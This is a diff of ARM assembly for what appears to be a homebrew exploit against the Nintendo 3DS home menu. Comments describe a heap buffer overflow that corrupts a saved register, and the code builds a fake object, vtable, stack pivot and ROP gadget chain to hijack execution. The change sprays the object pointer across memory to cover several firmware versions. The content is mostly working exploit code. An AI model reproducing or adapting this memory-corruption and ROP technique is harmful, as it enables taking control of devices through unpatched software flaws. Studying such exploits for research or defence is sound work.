@@ -5,7 +5,7 @@
 /*
 All function addresses referenced here are for v9.4 homemenu.
 
-The memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
+The CTRSDK memchunkhax(triggered by the buf overflow + memfree) triggers overwriting the saved r4 on the L_22fb34 stackframe, with value=<address of the below object label>. This is the function which called the memfree function.
 After calling some func which decreases some counter, homemenu then executes L_1ca5d0(r4), where r4 is the above overwritten ptr.
 L_1ca5d0: This first writes u8 value 1 to 0x3b7e. After checking/using other state, this function eventually executes: L_1d1ea8(*(inr0+0x3a60), 1);//where inr0=above ptr
 L_1d1ea8: After using other state, it executes: return L_2441a0(*(inr0+0x2f0), inr1);
@@ -206,28 +206,16 @@ stackpivot_pcloadword:
 .space ((object + 0x28) - .)
 .word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
 
-.space ((object + 0x2ec) - .)
-#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && MENUVERSION>12288) //Dunno if this applies for versions other than v9.2.
-.word 0 @ The target ptr offset is 0x4-bytes different from v9.2.
-#endif
-.word HEAPBUF + (object - _start) @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.
-
-.space ((object + 0x3a60) - .)
-#if (REGIONVAL==0 && MENUVERSION<=15360) || (REGIONVAL!=0 && MENUVERSION<=12288) //Dunno if this applies for versions other than v9.2.
-.word 0 @ The target ptr offset is 0x4-bytes different from v9.4.
-#endif
-#if (REGIONVAL==0 && MENUVERSION>=19476) || (REGIONVAL!=0 && MENUVERSION>=16404) //Check for system-version v9.6.
-.space 0x40
-#endif
-.word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
+@ Fill memory with the ptrs used by the following:
+@ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.
+@ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
+.fill (((object + 0x3a60 + 0x100) - .) / 4), 4, (HEAPBUF + (object - _start))
 
 vtable:
 .word 0, 0 @ vtable+0
 .word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
 .word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
 .word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20
-
-.space ((vtable + 0x100) - .)
 
 .space ((object + 0x4000) - .) @ Base the tmpdata followed by stack, at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).
 
